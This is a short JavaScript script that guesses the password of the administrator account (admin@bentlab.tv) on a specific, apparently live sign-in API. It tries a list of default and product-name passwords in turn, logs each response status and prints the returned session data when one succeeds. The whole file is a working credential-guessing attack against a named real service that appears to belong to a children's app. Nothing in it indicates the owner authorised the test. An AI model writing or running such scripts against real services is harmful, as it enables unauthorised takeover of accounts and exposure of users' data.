const passwords = [
  'admin',
  'password',
  'admin123',
  'admin123456',
  'admin123!',
  'bentlab',
  'bentlabkids',
  'bentlab123',
  'kidsapp',
  'kidsapp123',
  'change-me',
  'changeme',
];

async function testPassword(password) {
  try {
    const res = await fetch('https://bentlabkids-api-bxzh.onrender.com/api/v1/sign-in', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@bentlab.tv', password })
    });
    console.log(`Password: "${password}" -> Status: ${res.status}`);
    if (res.ok) {
      const data = await res.json();
      console.log('SUCCESS!', JSON.stringify(data, null, 2));
      return true;
    }
  } catch (e) {
    console.error(`Failed for "${password}":`, e.message);
  }
  return false;
}

async function main() {
  for (const p of passwords) {
    const success = await testPassword(p);
    if (success) break;
  }
}

main();
